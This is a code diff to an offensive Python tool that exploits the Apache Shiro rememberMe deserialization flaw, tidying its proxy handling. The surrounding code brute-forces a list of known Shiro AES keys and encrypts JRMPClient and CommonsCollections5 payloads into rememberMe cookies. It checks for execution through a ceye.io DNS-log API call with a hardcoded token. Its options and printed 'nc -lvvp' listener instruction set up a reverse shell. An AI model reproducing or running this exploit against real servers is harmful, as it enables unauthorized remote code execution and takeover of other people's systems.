@@ -2,14 +2,11 @@
 # coding:utf-8
 
 import logging
-import sys
 import uuid
-import json
 import base64
 import subprocess
 import requests
 import random
-import time
 from Crypto.Cipher import AES
 from optparse import OptionParser, OptionGroup
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -23,10 +20,18 @@ class Shiro_RememberMe(object):
         If  not using proxy, please change to None
         : proxies = None
         """
-        self.proxy = {} #{'http':"127.0.0.1:1081","https":"127.0.0.1:1081"}
         self.parseArguments()
         self._EXP_class = ["JRMPClient",'CommonsCollections5']
+        
+        if self.proxy:
+            self.proxies = {
+                "http": self.proxy,
+                "https": self.proxy
+                }
+        else:
+            self.proxies = {
 
+            }
         if self.url is None:
             print('URL target is missing, try using -u <url> ')
             exit(0)
@@ -56,7 +61,7 @@ class Shiro_RememberMe(object):
         "wGiHplamyXlVB11UXWol8g==","Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==",
         "fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==",
         "r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw=="]
-        # CipherKey = ['fCq+/xW488hMTCD+cmJ3aQ==']
+
         try:
             print("[*] Try to use {} payload...".format(self._EXP_class[0]))
             for key in CipherKey:
@@ -66,14 +71,11 @@ class Shiro_RememberMe(object):
                 print("[*] Using Key: {}".format(key))
                 base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,command)
                 print("[*] base64_decodeTXT: rememberMe={}".format(base64_ciphertext.decode()))
-                try:
-                    response = requests.post(self.url, timeout=1, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxy) # proxies=self.proxy
-                    if response.status_code == 500:
-                        raise Exception("Network error occurred in the first request")
-                except Exception as error:
-                    print(error)
+                response = requests.post(self.url, timeout=1, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxies) # proxies=self.proxy
+                if response.status_code == 500:
+                    raise Exception("Network error occurred in the first request")
                 print ('[*] Request to target URL success!\n')
-                req = requests.get('http://api.ceye.io/v1/records?token=603fd72e8621857c2b4c116fc5c1ede7&type=dns',timeout=5,proxies=self.proxy)
+                req = requests.get('http://api.ceye.io/v1/records?token=603fd72e8621857c2b4c116fc5c1ede7&type=dns',timeout=5,proxies=self.proxies)
                 if req.status_code == 500:
                     raise Exception("Network error occurred in the second request")
                 if command in req.text:
@@ -94,9 +96,9 @@ class Shiro_RememberMe(object):
         print("\033[01;34m[*] Please create a command line window to enter commands\033[0m: \n\033[1;31mnc -lvvp {}\033[0m\n".format(self.ip+":"+self.port))
         print("\033[01;34m[*] Please create a command line window to enter commands\033[0m: \n\033[1;31m{}\033[0m\n".format(command))
 
-        base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,self.ip+":"+self.JRMPListener) #设置监听
+        base64_ciphertext = self.encode_rememberme(self._EXP_class[0],key,self.ip+":"+self.JRMPListener)
         print("\033[01;34m[*] base64_decodeTXT\033[0m: \n\033[1;31mrememberMe={}\033[0m".format(base64_ciphertext.decode()))
-        response = requests.post(self.url, timeout=20, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxy) #proxies=self.proxy
+        response = requests.post(self.url, timeout=20, verify=False,cookies={"rememberMe": base64_ciphertext.decode()},proxies=self.proxies) #proxies=self.proxy
         if response.status_code == 500:
             print("Network error....")
             exit(0)
@@ -109,7 +111,7 @@ class Shiro_RememberMe(object):
         mandatory.add_option('--ip', '--reflex_IP', help='反弹shell的IP 默认当前外网地址', action='store', dest='reflexIP', default=None)
         mandatory.add_option('--port', '--reflex_PORT', help='反弹shell的PORT 默认8888', action='store', dest='reflexPORT', default='8888')
         mandatory.add_option('-l', '--JRMPListener', help='监听地址 默认3888', action='store', dest='JRMPListener', default='3888')
-        mandatory.add_option('--proxy', '--http-proxy', action='store', dest='httpProxy', type='string',default=self.proxy, help='Http Proxy (example: localhost:8080')
+        mandatory.add_option('--proxy', '--http-proxy', action='store', dest='httpProxy', type='string', help='Http Proxy (example: localhost:8080')
         mandatory.add_option('--shell', '--reverse-Shell',  dest='shell', type='string',default=False, help='reverse-Shell [Arbitrary parameter]')
 
         parser.add_option_group(mandatory)
